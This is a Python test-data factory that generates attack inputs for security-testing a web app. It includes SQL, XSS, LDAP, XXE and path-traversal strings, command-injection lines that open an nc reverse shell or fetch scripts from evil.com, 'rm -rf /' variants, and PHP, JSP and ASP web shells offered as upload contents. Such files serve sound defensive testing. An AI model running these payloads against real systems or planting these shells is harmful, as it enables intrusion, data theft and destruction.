# tests/security_test_data.py
"""
Security-specific test data factory for generating malicious inputs
and edge cases for security testing.
"""

from typing import List, Dict, Any


class SecurityTestDataFactory:
    """Factory for generating security test data and malicious inputs."""

    @staticmethod
    def sql_injection_payloads() -> List[Dict[str, Any]]:
        """Generate SQL injection payloads for testing."""
        return [
            {"email": "'; DROP TABLE users; --", "password": "password"},
            {"email": "' OR '1'='1", "password": "password"},
            {"email": "' OR 1=1 --", "password": "password"},
            {"email": "' UNION SELECT * FROM users --", "password": "password"},
            {"email": "admin' --", "password": "password"},
            {"email": "admin' /*", "password": "password"},
            {"email": "' OR 'x'='x", "password": "password"},
            {"email": "1' OR '1'='1' /*", "password": "password"},
        ]

    @staticmethod
    def xss_payloads() -> List[str]:
        """Generate XSS payloads for testing."""
        return [
            "<script>alert('xss')</script>",
            "<script>alert(document.cookie)</script>",
            "<script>window.location='http://evil.com'</script>",
            "<img src=x onerror=alert('xss')>",
            "<img src=x onerror=alert(document.cookie)>",
            "<svg onload=alert('xss')>",
            "<iframe src=javascript:alert('xss')>",
            "<body onload=alert('xss')>",
            "<input onfocus=alert('xss') autofocus>",
            "<select onfocus=alert('xss') autofocus>",
            "<textarea onfocus=alert('xss') autofocus>",
            "<keygen onfocus=alert('xss') autofocus>",
            "<video><source onerror=alert('xss')>",
            "<audio src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<script>eval(String.fromCharCode(88,83,83))</script>",
        ]

    @staticmethod
    def path_traversal_payloads() -> List[str]:
        """Generate path traversal payloads for testing."""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/etc/passwd",
            "/etc/shadow",
            "/windows/system32/config/sam",
            "/proc/version",
            "/proc/self/environ",
            "con",  # Windows reserved name
            "prn",  # Windows reserved name
            "aux",  # Windows reserved name
            "nul",  # Windows reserved name
        ]

    @staticmethod
    def command_injection_payloads() -> List[str]:
        """Generate command injection payloads for testing."""
        return [
            "; ls -la",
            "| cat /etc/passwd",
            "& echo 'malicious'",
            "`whoami`",
            "$(id)",
            "; rm -rf /*",
            "| nc attacker.com 4444 -e /bin/sh",
            "& wget http://evil.com/malware.sh",
            "; curl http://evil.com/steal_data.sh",
            "`python -c 'import os; os.system(\"rm -rf /\")'`",
            "$(perl -e 'system(\"rm -rf /\");')",
        ]

    @staticmethod
    def ldap_injection_payloads() -> List[str]:
        """Generate LDAP injection payloads for testing."""
        return [
            "*)(|(objectClass=*)",
            "*)(|(objectClass=*))",
            "*)%00",
            "*)(|(objectClass=*)",
            "*)(|(objectClass=*)(cn=*",
            "*)(|(objectClass=*)(cn=*))",
            "*)(|(objectClass=*))(cn=*",
            "*)(|(objectClass=*))(cn=*))",
            "admin)(&(password=*))",
            "*)(&(uid=*",
        ]

    @staticmethod
    def xml_injection_payloads() -> List[str]:
        """Generate XML injection payloads for testing."""
        return [
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root>&xxe;</root>",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///windows/system32/drivers/etc/hosts\">]><root>&xxe;</root>",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE data [<!ENTITY data SYSTEM \"php://filter/read=convert.base64-encode/resource=index.php\">]><root>&data;</root>",
            "<root xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></root>",
            "<?xml version=\"1.0\"?><!DOCTYPE lolz [\n<!ENTITY lol \"lol\">\n<!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n<!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n]><lolz>&lol3;</lolz>",
        ]

    @staticmethod
    def buffer_overflow_payloads() -> List[str]:
        """Generate buffer overflow payloads for testing."""
        payloads = []

        # Large strings
        for size in [1000, 10000, 100000]:
            payloads.append("A" * size)

        # Format string vulnerabilities
        payloads.extend([
            "%s%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x%x",
            "%p%p%p%p%p%p%p%p%p",
            "%n%n%n%n%n%n%n%n%n",
        ])

        # Integer overflow
        payloads.extend([
            "2147483648",  # INT_MAX + 1
            "9223372036854775808",  # LONG_MAX + 1
        ])

        return payloads

    @staticmethod
    def unicode_attacks() -> List[str]:
        """Generate Unicode attack payloads."""
        return [
            "\ufeff\x00\x0d\x0a",  # BOM and control characters
            "%2e%2e%2f",  # URL encoded path traversal
            "&#60;script&#62;alert('xss')&#60;/script&#62;",  # HTML encoded XSS
            "%uff0e%uff0e%uff0f",  # Unicode dots and slash
            "\xc0\xaf\xc0\xae\xc0\xaf",  # Overlong UTF-8 encoding
            "\xe0\x80\xaf\xe0\x80\xae\xe0\x80\xaf",  # Another overlong encoding
        ]

    @staticmethod
    def header_injection_payloads() -> List[Dict[str, str]]:
        """Generate HTTP header injection payloads."""
        return [
            {"User-Agent": "Mozilla/5.0\r\nX-Forwarded-For: 127.0.0.1"},
            {"Referer": "http://example.com\r\nCookie: session=stolen"},
            {"X-Forwarded-For": "127.0.0.1\r\nX-Real-IP: 192.168.1.1"},
            {"Accept": "application/json\r\nX-Forwarded-Host: evil.com"},
        ]

    @staticmethod
    def malicious_filenames() -> List[str]:
        """Generate malicious filenames for testing file upload security."""
        return [
            "../../../etc/passwd.jpg",
            "..\\..\\..\\windows\\system32\\config\\sam.jpg",
            "file\x00null.jpg",  # Null byte injection
            "con.jpg",  # Windows reserved name
            "prn.jpg",  # Windows reserved name
            "aux.jpg",  # Windows reserved name
            "nul.jpg",  # Windows reserved name
            "very_long_filename_" + "a" * 250 + ".jpg",  # Overly long filename
            "file|pipe.jpg",  # Pipe character
            "file?query.jpg",  # Query string
            "file#fragment.jpg",  # Fragment
            "file%00.jpg",  # URL encoded null byte
            "file<script>alert('xss')</script>.jpg",  # XSS in filename
            "file:stream.jpg",  # Alternate data stream (Windows)
        ]

    @staticmethod
    def malicious_file_contents() -> List[Dict[str, Any]]:
        """Generate malicious file content for testing."""
        return [
            {
                "filename": "malicious.exe",
                "content": b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff",  # PE header
                "content_type": "application/octet-stream"
            },
            {
                "filename": "script.php",
                "content": b"<?php system($_GET['cmd']); ?>",
                "content_type": "application/x-php"
            },
            {
                "filename": "shell.jsp",
                "content": b"<%@ page import=\"java.io.*\" %><%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
                "content_type": "application/x-jsp"
            },
            {
                "filename": "exploit.asp",
                "content": b"<% Response.Write(CreateObject(\"WScript.Shell\").Exec(\"cmd.exe /c \" & Request(\"cmd\")).StdOut.ReadAll()) %>",
                "content_type": "application/x-asp"
            },
            {
                "filename": "malware.js",
                "content": b"eval(String.fromCharCode(87,105,110,100,111,119,46,108,111,99,97,116,105,111,110,61,34,104,116,116,112,58,47,47,101,118,105,108,46,99,111,109,47,115,116,101,97,108,46,106,115,34))",
                "content_type": "application/javascript"
            },
            {
                "filename": "zip_bomb.zip",
                "content": b"PK\x03\x04" + b"\x00" * 1000,  # Small zip that expands to huge size
                "content_type": "application/zip"
            },
            {
                "filename": "steganography.jpg",
                "content": b"\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00H\x00H\x00\x00" + b"MALICIOUS_PAYLOAD_HIDDEN_IN_IMAGE",
                "content_type": "image/jpeg"
            },
        ]

    @staticmethod
    def password_attacks() -> List[Dict[str, Any]]:
        """Generate password attack payloads."""
        return [
            {"category": "common_passwords", "passwords": [
                "123456", "password", "123456789", "12345678", "12345", "111111",
                "1234567", "sunshine", "qwerty", "iloveyou", "princess", "admin",
                "welcome", "666666", "abc123", "football", "123123", "monkey", "654321"
            ]},
            {"category": "keyboard_patterns", "passwords": [
                "qwerty", "asdfghjkl", "zxcvbnm", "qwertyuiop", "1234567890",
                "1qaz2wsx", "qazwsx", "123qwe", "asdf", "zxcv"
            ]},
            {"category": "weak_variations", "passwords": [
                "password1", "password123", "admin123", "root123", "test123",
                "user123", "guest123", "temp123", "demo123", "default123"
            ]},
            {"category": "brute_force_short", "passwords": [
                "a", "aa", "aaa", "aaaa", "aaaaa", "aaaaaa", "aaaaaaa",
                "b", "bb", "bbb", "bbbb", "bbbbb", "bbbbbb", "bbbbbbb",
                "1", "11", "111", "1111", "11111", "111111", "1111111"
            ]},
        ]

    @staticmethod
    def session_attacks() -> List[Dict[str, Any]]:
        """Generate session-based attack payloads."""
        return [
            {"type": "session_fixation", "session_ids": [
                "abcdef123456", "000000000000", "111111111111", "admin", "test",
                "session", "phpsessid", "jsessionid", "aspsessionid", "sid"
            ]},
            {"type": "session_hijacking", "headers": [
                {"Cookie": "sessionid=stolen_session_id"},
                {"Authorization": "Bearer stolen_jwt_token"},
                {"X-Auth-Token": "stoken123"},
                {"Auth": "stolen_token"},
            ]},
            {"type": "csrf_tokens", "tokens": [
                "", "null", "undefined", "12345", "abcde", "csrf_token",
                "anti-csrf", "request_token", "form_token"
            ]},
        ]

    @staticmethod
    def api_attack_patterns() -> List[Dict[str, Any]]:
        """Generate API-specific attack patterns."""
        return [
            {"type": "mass_assignment", "payloads": [
                {"email": "test@example.com", "password": "password", "role": "admin"},
                {"email": "test@example.com", "password": "password", "is_active": True},
                {"email": "test@example.com", "password": "password", "permissions": ["all"]},
            ]},
            {"type": "parameter_pollution", "payloads": [
                {"email": ["test@example.com", "admin@example.com"], "password": "password"},
                {"email": "test@example.com", "password": ["password", "admin"]},
                {"id": ["1", "2", "3"]},
            ]},
            {"type": "injection_via_parameters", "payloads": [
                {"search": "'; DROP TABLE users; --"},
                {"filter": {"$ne": None}},
                {"sort": {"$where": "function() { return true; }"}},
                {"limit": {"$gt": 0}},
            ]},
            {"type": "bypass_validation", "payloads": [
                {"email": None, "password": "password"},
                {"email": "", "password": ""},
                {"email": "test@", "password": "pass"},
                {"email": "test@example.", "password": "pass"},
            ]},
        ]

    @staticmethod
    def timing_attacks() -> List[Dict[str, Any]]:
        """Generate timing attack payloads."""
        return [
            {"type": "blind_sql_injection", "payloads": [
                {"email": "test@example.com' AND SLEEP(5) --", "password": "password"},
                {"email": "test@example.com' AND (SELECT COUNT(*) FROM users WHERE email='admin' AND SLEEP(3)) --", "password": "password"},
                {"email": "test@example.com' AND IF(1=1,SLEEP(5),0) --", "password": "password"},
            ]},
            {"type": "password_timing", "payloads": [
                "a", "b", "c", "d", "e", "f", "g", "h", "i", "j",
                "k", "l", "m", "n", "o", "p", "q", "r", "s", "t",
                "u", "v", "w", "x", "y", "z", "0", "1", "2", "3",
                "4", "5", "6", "7", "8", "9", "!", "@", "#", "$",
            ]},
        ]

    @staticmethod
    def generate_comprehensive_attack_data() -> Dict[str, List]:
        """Generate comprehensive attack data for all categories."""
        return {
            "sql_injection": SecurityTestDataFactory.sql_injection_payloads(),
            "xss": SecurityTestDataFactory.xss_payloads(),
            "path_traversal": SecurityTestDataFactory.path_traversal_payloads(),
            "command_injection": SecurityTestDataFactory.command_injection_payloads(),
            "ldap_injection": SecurityTestDataFactory.ldap_injection_payloads(),
            "xml_injection": SecurityTestDataFactory.xml_injection_payloads(),
            "buffer_overflow": SecurityTestDataFactory.buffer_overflow_payloads(),
            "unicode_attacks": SecurityTestDataFactory.unicode_attacks(),
            "malicious_filenames": SecurityTestDataFactory.malicious_filenames(),
            "malicious_file_contents": SecurityTestDataFactory.malicious_file_contents(),
            "password_attacks": SecurityTestDataFactory.password_attacks(),
            "session_attacks": SecurityTestDataFactory.session_attacks(),
            "api_attack_patterns": SecurityTestDataFactory.api_attack_patterns(),
            "timing_attacks": SecurityTestDataFactory.timing_attacks(),
        }